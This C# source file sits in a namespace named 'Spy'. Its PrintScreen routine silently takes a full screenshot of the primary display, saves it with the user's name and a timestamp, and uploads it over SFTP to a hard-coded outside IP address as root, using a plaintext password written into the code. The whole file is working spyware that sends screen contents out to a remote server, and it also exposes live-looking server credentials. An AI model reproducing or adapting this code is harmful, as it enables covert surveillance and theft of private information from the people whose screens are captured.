using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.IO;

namespace Spy.util
{
    class PrintScreen
    {
        static public void PrintS() 
        {       
            Bitmap image = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics imgGraphics = Graphics.FromImage(image);
            imgGraphics.CopyFromScreen(0, 0, 0, 0, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)); //设置截屏区域 
            string exepath = Environment.CurrentDirectory;
            if (System.IO.File.Exists(exepath + @"\Text1.txt") == true)
            {
                StreamReader sr = File.OpenText(exepath + @"\Text1.txt");
                string path =sr.ReadLine();
                if (Directory.Exists(path) == false)//如果不存在就创建file文件夹
                {
                    Directory.CreateDirectory(path);
                }
                string format= Main.user + DateTime.Now.ToString("yyyy-M-d@HH.mm.ss") ;
                image.Save(path + format + ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg); ;//保存
                var upload = new Spy.background.SFTPOperation("120.27.47.166", "22", "root", "Zhang7890078");
                upload.Put(path + format + ".jpg", "/root/img/" + format + ".jpg");
                sr.Close();
            }
            else
            {
                MessageBox.Show("保存路径不存在自动保存在" + exepath + @"\PrintScreen");
                File.WriteAllText(exepath + @"\Text1.txt", exepath + @"\PrintScreen\");
                if (Directory.Exists(exepath + @"\PrintScreen\") == false)//如果不存在就创建file文件夹
                {
                    Directory.CreateDirectory(exepath + @"\PrintScreen\");

                }

                string format = Main.user + DateTime.Now.ToString("yyyy-M-d@HH.mm.ss");
                image.Save(exepath + @"\PrintScreen\" + format + ".jpg", System.Drawing.Imaging.ImageFormat.Jpeg); ;//保存
                var upload = new Spy.background.SFTPOperation("120.27.47.166", "22", "root", "Zhang7890078");
                upload.Put(exepath + @"\PrintScreen\" + format + ".jpg", "/root/img/" + format + ".jpg");
            }
        }

    }
    

}
